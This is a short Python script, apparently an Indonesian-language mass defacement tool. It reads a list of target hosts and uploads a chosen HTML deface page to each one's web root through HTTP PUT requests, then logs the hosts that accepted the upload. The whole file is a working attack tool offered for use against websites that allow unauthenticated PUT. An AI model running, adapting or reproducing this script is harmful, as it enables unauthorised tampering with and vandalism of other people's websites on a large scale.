import requests
import sys
import os

print("""
'\\  //`     ||`         .|';                      
  \\//       ||          ||                        
   ><    .|''||  .|''|, '||'   '''|.  .|'', .|''|, 
  //\\   ||  ||  ||..||  ||   .|''||  ||    ||..|| 
.//  \\. `|..||. `|...  .||.  `|..||. `|..' `|...
 """
)
if len(sys.argv) != 3:
 print("\n\033[33;1m[*]\033[0m python "+sys.argv[0]+" target.txt deface.html \033[33;1m[*]")
 exit(0)
os.system('clear')

target = open(sys.argv[1], 'r')
while True:
 scheker = open(sys.argv[2]).read()
 sukses = open('sucses.txt', 'a')
 host = target.readline().replace('\n','')
 if not host:
  break
 if not host.startswith('http'):
  host = 'http://' + host
 outname = '/'+sys.argv[2]
 print('\033[33;1m[*]\033[0m mengirim file  : '+sys.argv[2])
 print('\033[33;1m[*]\033[0m ukuran file    : '+str(len(scheker)))
 print('\033[33;1m[*]\033[0m Target         : '+host)
 try:
    r = requests.request('put', host + outname, data=scheker, headers={'Content-Type':'application/octet-stream'})
 except:
    print('\033[31;1m[-]\033[0m Gagal          : Tidak di tanggapi\n')
    pass
    continue
 if r.status_code == 200:
  print('\033[32;1m[+]\033[0m Berhasil        : '+host+outname+'\n')
  sukses.write(host+outname+'\n')
 else:
  print('\033[31;1m[-]\033[0m Gagal           : '+host+outname+'\n')

print("\033[34;1m[*]\033[0m Output Saved On : gagal.txt")
